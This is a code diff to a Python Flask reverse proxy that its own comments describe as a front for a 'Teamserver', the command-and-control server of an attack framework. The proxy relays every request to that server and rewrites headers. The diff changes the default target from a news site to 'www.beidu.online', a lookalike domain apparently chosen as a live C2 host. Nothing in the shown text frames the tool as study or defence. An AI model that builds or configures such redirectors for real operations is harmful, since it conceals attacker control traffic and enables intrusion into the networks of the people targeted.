@@ -41,7 +41,7 @@ import urllib.parse
 # Point onto your Teamserver or a landing page you want to reverse-proxy.
 # Cannot contain http:// , https:// and trailing slash
 
-teamserver          = os.environ.get('TEAMSERVER', 'www.bbc.com')
+teamserver          = os.environ.get('TEAMSERVER', 'www.beidu.online') 
 
 # If true, will set Host header with value from `teamserver`
 rewrite_host_header = True
@@ -59,21 +59,21 @@ method_requests_mapping = {
 }
 
 def create_app():
-    app = flask.Flask(__name__)
+    app = flask.Flask(__name__) 
 
-    @app.route('/', defaults={'path': ''}, methods=method_requests_mapping.keys())
-    @app.route('/<path:path>', methods=method_requests_mapping.keys())
+    @app.route('/', defaults={'path': ''}, methods=method_requests_mapping.keys()) 
+    @app.route('/<path:path>', methods=method_requests_mapping.keys()) 
     def main(path):
 
         url     = flask.request.url
         headers = dict(flask.request.headers)
         params  = flask.request.args
         method  = flask.request.method
-        body    = flask.request.data
+        body    = flask.request.data 
 
         try:
             print(f'[proxy] Request: {method} "{url}"')
-            parsed  = urllib.parse.urlparse(url)
+            parsed  = urllib.parse.urlparse(url) 
             url = parsed._replace(netloc = teamserver).geturl()
             print(f'[proxy] Replaced URL to: "{url}"')
 
